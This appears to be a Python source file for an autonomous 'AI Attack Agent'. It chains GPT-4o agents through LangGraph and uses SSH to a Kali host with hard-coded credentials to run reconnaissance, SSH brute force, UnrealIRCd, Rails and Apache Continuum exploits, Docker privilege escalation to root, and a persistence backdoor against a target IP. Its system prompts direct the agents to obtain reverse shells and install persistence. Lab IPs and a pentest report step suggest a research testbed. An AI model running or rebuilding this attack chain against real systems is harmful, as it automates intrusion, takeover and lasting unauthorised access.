import os
import sys

import dotenv
import paramiko
import time
from typing import TypedDict, Annotated, List
import operator
from langchain_openai import ChatOpenAI
from langchain_core.tools import tool
from langchain_core.messages import BaseMessage, HumanMessage, SystemMessage
from langgraph.graph import StateGraph, END
from langgraph.prebuilt import ToolNode, tools_condition
from datetime import datetime
import json
from pathlib import Path

from rag import query_knowledge_base

# --- CONFIGURATION ---
KALI_IP = "192.168.34.6"
KALI_USER = "kali"
KALI_PASS = "kali"
# NOTE: Ensure this path matches exactly where you saved test.py, test3.py, test4.py, test5.py
REMOTE_WORK_DIR = "~/CREMEv2/CREME_backend_execution/scripts/02_scenario"
REMOTE_ENV = "source ~/.venvs/redteamingenv/bin/activate"
LOG_FOLDER_NAME = "creme_logs"


dotenv.load_dotenv()
OPENAI_API_KEY = os.getenv("OPENAI_API_KEY")

# --- HELPER FUNCTION FOR SSH ---
def _run_ssh_command(command_str, description):
    """Helper to run SSH commands with streamed output"""
    print(f"\n[{description}] Connecting to Kali ({KALI_IP})...")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(KALI_IP, username=KALI_USER, password=KALI_PASS, timeout=10)
        print(f"[{description}] Connection success")
        print(f"[{description}] Executing: {command_str}")

        stdin, stdout, stderr = ssh.exec_command(command_str)
        output_buffer = []

        # Stream output
        for line in iter(stdout.readline, ""):
            print(line, end="")
            sys.stdout.flush()
            output_buffer.append(line)

        err_output = stderr.read().decode()
        if err_output:
            print(f"\n[Remote STDERR]: {err_output}")

        exit_status = stdout.channel.recv_exit_status()
        full_log = "".join(output_buffer)

        if exit_status == 0:
            print(f"[{description}] Success (Exit Code: 0)")
            return True, full_log
        else:
            print(f"[{description}] Failed (Exit Code: {exit_status})")
            return False, full_log + f"\nError: {err_output}"

    except Exception as e:
        print(f"[{description}] Exception: {e}")
        return False, str(e)
    finally:
        ssh.close()


# --- TOOLS ---

@tool
def tool_recon_scan(target_ip: str):
    """
    Scans the target_ip using nmap.
    Use this tool first to identify open ports.
    """
    command = (
        f"{REMOTE_ENV} && cd {REMOTE_WORK_DIR} && "
        f"python3 03_ransomware/python_files/attacker_server/01_step_Ransomware.py {LOG_FOLDER_NAME} {KALI_IP} {target_ip}"
    )
    success, output = _run_ssh_command(command, "nmap Tool")
    if success:
        return f"Nmap Scan Successful.\nOutput:\n{output}"
    return f"Nmap Scan Failed.\nOutput:\n{output}"


@tool
def run_ssh_bruteforce(target_ip: str):
    """
    Runs bruteforce ssh password cracking on target_ip.
    Use this if port 22 is open to find credentials.
    """
    command = (
        f"{REMOTE_ENV} && cd {REMOTE_WORK_DIR} && "
        f"python3 03_ransomware/python_files/attacker_server/test.py {LOG_FOLDER_NAME} {KALI_IP} {target_ip}"
    )
    success, output = _run_ssh_command(command, "ssh_bruteforce Tool")
    if success:
        return f"SSH Bruteforce Successful.\nOutput:\n{output}"
    return f"SSH Bruteforce Failed.\nOutput:\n{output}"


@tool
def tool_exploit_unreal(target_ip: str):
    """
    Exploits UnrealIRCd backdoor (port 6697) to gain initial access.
    Returns a Session ID if successful.
    """
    command = (
        f"{REMOTE_ENV} && cd {REMOTE_WORK_DIR} && "
        f"python3 -u 03_ransomware/python_files/attacker_server/test3.py {LOG_FOLDER_NAME} {KALI_IP} {target_ip}"
    )
    success, output = _run_ssh_command(command, "UnrealIRCd Exploit Tool")
    if success:
        return f"Exploitation Successful.\nOutput:\n{output}"
    return f"Exploitation Failed.\nOutput:\n{output}"


@tool
def tool_exploit_rails(target_ip: str):
    """
    Exploits the Ruby on Rails 'secret_deserialization' vulnerability (Port 8181).

    Use this tool for Initial Access in the 'Disk Wipe' scenario.
    It targets a vulnerable Rails app on port 8181 using a known secret key.
    If successful, it upgrades the shell to Meterpreter and returns the Session ID.

    :param target_ip: The IP address of the target machine (e.g., '192.168.34.101').
    :return: Output log containing the NEW_SESSION_ID.
    """
    print(f"\n[Rails Exploit Tool] tool_diskwipe_exploit: {target_ip}")
    print(f"[Rails Exploit Tool] Connecting to Kali ({KALI_IP})...")

    # Ensure you saved the python script above as 'test_dw_3.py' in the correct folder
    command = (
        f"{REMOTE_ENV} && "
        f"cd {REMOTE_WORK_DIR} && "
        f"python3 -u 02_disk_wipe/python_files/attacker_server/test_dw_3.py {LOG_FOLDER_NAME} {KALI_IP} {target_ip}"
    )

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(KALI_IP, username=KALI_USER, password=KALI_PASS, timeout=10)
        print("[Rails Exploit Tool] Connection success")
        print(f"[Rails Exploit Tool] Running Command: {command}")

        stdin, stdout, stderr = ssh.exec_command(command)

        output_buffer = []
        for line in iter(stdout.readline, ""):
            print(line, end="")
            sys.stdout.flush()
            output_buffer.append(line)

        err_output = stderr.read().decode()
        if err_output:
            print(f"\n[Remote STDERR]:\n{err_output}")

        exit_status = stdout.channel.recv_exit_status()
        full_log = "".join(output_buffer)

        if exit_status == 0:
            print(f"[Rails Exploit Tool] Exploit Successful (Exit Code: 0)")
            return f"Disk Wipe Exploit Successful.\nOutput:\n{full_log}"
        else:
            print(f"[Rails Exploit Tool] Exploit Failed (Exit Code: {exit_status})")
            return f"Exploit Failed.\nSTDERR: {err_output}\nSTDOUT: {full_log}"

    except Exception as e:
        return f"SSH Connection Failed: {e}"
    finally:
        ssh.close()

@tool
def run_privilege_escalation(target_ip: str, session_id: int):
    """
    Elevates a low-privilege session to Root using Docker exploit.
    Requires a valid session_id.
    """
    command = (
        f"{REMOTE_ENV} && cd {REMOTE_WORK_DIR} && "
        f"python3 -u 03_ransomware/python_files/attacker_server/test4.py {LOG_FOLDER_NAME} {KALI_IP} {target_ip} {session_id}"
    )
    success, output = _run_ssh_command(command, "PrivEsc Tool")
    if success:
        return f"Privilege Escalation Successful.\nOutput:\n{output}"
    return f"Privilege Escalation Failed.\nOutput:\n{output}"


@tool
def run_persistence_exploit(target_ip: str, session_id: int):
    """
    Installs a persistence backdoor service on the target.
    Requires a ROOT session_id (obtained from Privilege Escalation).
    """
    command = (
        f"{REMOTE_ENV} && cd {REMOTE_WORK_DIR} && "
        f"python3 -u 03_ransomware/python_files/attacker_server/test5.py {LOG_FOLDER_NAME} {KALI_IP} {target_ip} {session_id}"
    )
    success, output = _run_ssh_command(command, "Persistence Tool")
    if success:
        return f"Persistence Installation Successful.\nOutput:\n{output}"
    return f"Persistence Installation Failed.\nOutput:\n{output}"


@tool
def tool_exploit_apache(target_ip: str):
    """
    Exploits the Apache Continuum Command Execution vulnerability (Step 3).

    Use this tool for Initial Access in the 'Resource Hijacking' scenario.
    It targets a vulnerable Apache Continuum service to gain a remote shell.
    If successful, it returns the NEW_SESSION_ID.

    :param target_ip: The IP address of the target machine.
    :return: Output log containing the NEW_SESSION_ID.
    """
    print(f"\n[Apache Exploit Tool] tool_exploit_apache: {target_ip}")
    print(f"[Apache Exploit Tool] Connecting to Kali ({KALI_IP})...")

    # Ensure 'test_resource_hijacking.py' is saved in the correct folder on Kali
    # Assuming you saved it in the '04_resource_hijacking' folder structure
    command = (
        f"{REMOTE_ENV} && "
        f"cd {REMOTE_WORK_DIR} && "
        f"python3 -u 04_resource_hijacking/python_files/attacker_server/test_rh_3.py {LOG_FOLDER_NAME} {KALI_IP} {target_ip}"
    )

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(KALI_IP, username=KALI_USER, password=KALI_PASS, timeout=10)
        print("[Apache Exploit Tool] Connection success")
        print(f"[Apache Exploit Tool] Running Command: {command}")

        stdin, stdout, stderr = ssh.exec_command(command)

        output_buffer = []
        for line in iter(stdout.readline, ""):
            print(line, end="")
            sys.stdout.flush()
            output_buffer.append(line)

        err_output = stderr.read().decode()
        if err_output:
            print(f"\n[Remote STDERR]:\n{err_output}")

        exit_status = stdout.channel.recv_exit_status()
        full_log = "".join(output_buffer)

        if exit_status == 0:
            print(f"[Apache Exploit Tool] Exploit Successful (Exit Code: 0)")
            return f"Resource Hijacking Exploit Successful.\nOutput:\n{full_log}"
        else:
            print(f"[Apache Exploit Tool] Exploit Failed (Exit Code: {exit_status})")
            return f"Exploit Failed.\nSTDERR: {err_output}\nSTDOUT: {full_log}"

    except Exception as e:
        return f"SSH Connection Failed: {e}"
    finally:
        ssh.close()

# --- TOOL MAPPING ---
recon_tools = [tool_recon_scan, query_knowledge_base]
initial_access_tools = [run_ssh_bruteforce, query_knowledge_base]
execution_tools = [tool_exploit_unreal, tool_exploit_rails, tool_exploit_apache, query_knowledge_base]
privilege_escalation_tools = [run_privilege_escalation, query_knowledge_base]
persistence_tools = [run_persistence_exploit, query_knowledge_base]
rag_tool = [query_knowledge_base]


# --- NODE DEFINITIONS ---
class AgentState(TypedDict):
    messages: Annotated[List[BaseMessage], operator.add]
    current_step: str


def recon_agent_node(state: AgentState):
    messages = state['messages']
    model = ChatOpenAI(model="gpt-4o", temperature=0).bind_tools(recon_tools)
    response = model.invoke(["You are the Execution Agent. PLease execute the recons phase." +
                            "You have access to a knowledge base tool. You should use it before calling tools except the rag tool to confirm that your decisions are correct. "] +
                            messages)
    return {"messages": [response], "current_step": "recon"}


def initial_access_agent_node(state: AgentState):
    messages = state['messages']
    model = ChatOpenAI(model="gpt-4o", temperature=0).bind_tools(initial_access_tools)
    response = model.invoke(messages + ["You have access to a knowledge base tool. You should use it before calling tools except the rag tool to confirm that your decisions are correct. "])
    return {"messages": [response], "current_step": "initial_access"}


def execution_agent_node(state: AgentState):
    messages = state['messages']

    # --- Updated System Prompt ---
    sys_msg = SystemMessage(content="""
    You are the Execution Agent. 

    [OBJECTIVE]
    Your goal is to exploit the vulnerability identified in the previous step to gain a reverse shell that can be used.
    You have access to a knowledge base tool. You should use it EVERYTIME for confirmation your decisions are correct.

    [INSTRUCTIONS]
    1. Review the previous messages to identify the open port or service (e.g., UnrealIRCd on port 6697).
    2. Call the 'tool_exploitation' tool targeting the correct IP.
    3. **CRITICAL**: After the tool runs, READ THE OUTPUT CAREFULLY.
    4. Look for a line that says "NEW_SESSION_ID: <number>".
    5. If found, your final response MUST explicitly state: "I have successfully exploited the target and obtained Session ID: <number>." Then move on to the next stage.
    6. If no session is created, report the failure.
    """)

    model = ChatOpenAI(model="gpt-4o", temperature=0).bind_tools(execution_tools)
    response = model.invoke([sys_msg] + messages)
    return {"messages": [response], "current_step": "execution"}


def privilege_escalation_agent_node(state: AgentState):
    messages = state['messages']
    # System prompt to help agent find the Session ID from chat history
    sys_msg = SystemMessage(content="You are the PrivEsc Agent. Review previous logs for 'NEW_SESSION_ID' and use it."+
                            "You have access to a knowledge base tool. You should use it before calling tools except the rag tool to confirm that your decisions are correct. ")
    model = ChatOpenAI(model="gpt-4o", temperature=0).bind_tools(privilege_escalation_tools)
    response = model.invoke([sys_msg] + messages)
    return {"messages": [response], "current_step": "privilege_escalation"}


def persistence_agent_node(state: AgentState):
    messages = state['messages']
    # System prompt to help agent find the ROOT Session ID
    sys_msg = SystemMessage(
        content="You are the Persistence Agent. Find the NEW ROOT SESSION ID from the Privilege Escalation step output and use it to install persistence." +
    "You have access to a knowledge base tool. You should use it before calling tools except the rag tool to confirm that your decisions are correct. ")
    model = ChatOpenAI(model="gpt-4o", temperature=0).bind_tools(persistence_tools)
    response = model.invoke([sys_msg] + messages)
    return {"messages": [response], "current_step": "persistence"}


def evaluator_agent_node(state: AgentState):
    """
        Single-stage evaluator: Takes all execution outputs and generates
        comprehensive pentest report with LLM-based analysis
        """
    print("\n[Evaluator] Generating Final Report...")
    messages = state['messages']

    # Extract target IP from conversation
    target_ip = "192.168.34.3"
    for msg in messages:
        if isinstance(msg.content, str) and "192.168" in msg.content:
            parts = msg.content.split()
            for part in parts:
                if part.startswith("192.168"):
                    target_ip = part
                    break

    # Build comprehensive context from all message outputs
    execution_log = "\n".join([
        f"[{i}] {msg.content[:1000]}"
        for i, msg in enumerate(messages[-30:], 1)  # Last 30 messages for full context
    ])

    # Create evaluation prompt with all raw outputs
    prompt_file = Path(__file__).parent / "evaluation_prompt_template.txt"
    evaluation_prompt = prompt_file.read_text() + "You have access to a knowledge base tool. You should use it before calling tools except the rag tool to confirm that your decisions are correct. "
    model = ChatOpenAI(model="gpt-4o", temperature=0.3)
    response = model.invoke(messages + [HumanMessage(content=evaluation_prompt)])

    # Print report to console
    print("\n" + "=" * 80)
    print("PENETRATION TEST REPORT - MITRE ATT&CK FRAMEWORK ASSESSMENT")
    print("=" * 80)
    print(response.content)
    print("=" * 80)

    # Save report to file
    report_dir = Path(LOG_FOLDER_NAME) / "pentest_reports"
    report_dir.mkdir(parents=True, exist_ok=True)

    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"pentest_report_{target_ip}_{timestamp}.txt"
    filepath = report_dir / filename

    with open(filepath, 'w') as f:
        f.write("PENETRATION TEST REPORT - MITRE ATT&CK FRAMEWORK ASSESSMENT\n")
        f.write("=" * 80 + "\n")
        f.write(f"Target IP: {target_ip}\n")
        f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("=" * 80 + "\n\n")
        f.write(response.content)

    print(f"\n[✓ Report saved to: {filepath}]")

    return {
        "messages": [response],
        "current_step": "evaluator"
    }
    return {"messages": [HumanMessage(content="Evaluation Complete")], "current_step": "evaluator"}


# Tool Nodes
recon_tool_node = ToolNode(recon_tools)
initial_access_tool_node = ToolNode(initial_access_tools)
execution_tool_node = ToolNode(execution_tools)
privilege_escalation_tool_node = ToolNode(privilege_escalation_tools)
persistence_tool_node = ToolNode(persistence_tools)


# --- GRAPH CONSTRUCTION ---
workflow = StateGraph(AgentState)

# Add Agents
workflow.add_node("recon_agent", recon_agent_node)
workflow.add_node("initial_access_agent", initial_access_agent_node)
workflow.add_node("execution_agent", execution_agent_node)
workflow.add_node("privilege_escalation_agent", privilege_escalation_agent_node)
workflow.add_node("persistence_agent", persistence_agent_node)  # NEW
workflow.add_node("evaluator_agent", evaluator_agent_node)

# Add Tools
workflow.add_node("recon_tools", recon_tool_node)
workflow.add_node("initial_access_tools", initial_access_tool_node)
workflow.add_node("execution_tools", execution_tool_node)
workflow.add_node("privilege_escalation_tools", privilege_escalation_tool_node)
workflow.add_node("persistence_tools", persistence_tool_node)  # NEW
workflow.add_node("rag_tool", ToolNode(rag_tool))

workflow.set_entry_point("recon_agent")


# --- EDGES & ROUTING ---

def route_generic(state):
    last_message = state["messages"][-1]
    if last_message.tool_calls:
        return "tools"
    return "next"


# 1. Recon
workflow.add_conditional_edges("recon_agent", route_generic, {"tools": "recon_tools", "next": "initial_access_agent"})
workflow.add_edge("recon_tools", "recon_agent")

# 2. Initial Access
workflow.add_conditional_edges("initial_access_agent", route_generic,
                               {"tools": "initial_access_tools", "next": "execution_agent"})
workflow.add_edge("initial_access_tools", "initial_access_agent")

# 3. Execution
workflow.add_conditional_edges("execution_agent", route_generic,
                               {"tools": "execution_tools", "next": "privilege_escalation_agent"})
workflow.add_edge("execution_tools", "execution_agent")

# 4. PrivEsc
workflow.add_conditional_edges("privilege_escalation_agent", route_generic, {"tools": "privilege_escalation_tools",
                                                                             "next": "persistence_agent"})  # Point to Persistence
workflow.add_edge("privilege_escalation_tools", "privilege_escalation_agent")

# 5. Persistence (NEW)
workflow.add_conditional_edges("persistence_agent", route_generic,
                               {"tools": "persistence_tools", "next": "evaluator_agent"})  # Point to Evaluator
workflow.add_edge("persistence_tools", "persistence_agent")

# 6. End
workflow.add_edge("evaluator_agent", END)

app = workflow.compile()

if __name__ == "__main__":
    print("=== AI Attack Agent (Full Chain with Persistence) ===")
    while True:
        u_in = input("\n[User]: ")
        if u_in.lower() in ["quit", "exit"]: break

        initial_state = {"messages": [HumanMessage(content=u_in)], "current_step": "recon"}
        for event in app.stream(initial_state):
            for key, value in event.items():
                if "agent" in key:
                    msg = value["messages"][-1]
                    if msg.tool_calls:
                        print(f"  [{key}] Decision -> Call {msg.tool_calls[0]['name']}")
                    else:
                        print(f"  [{key}] {msg.content}")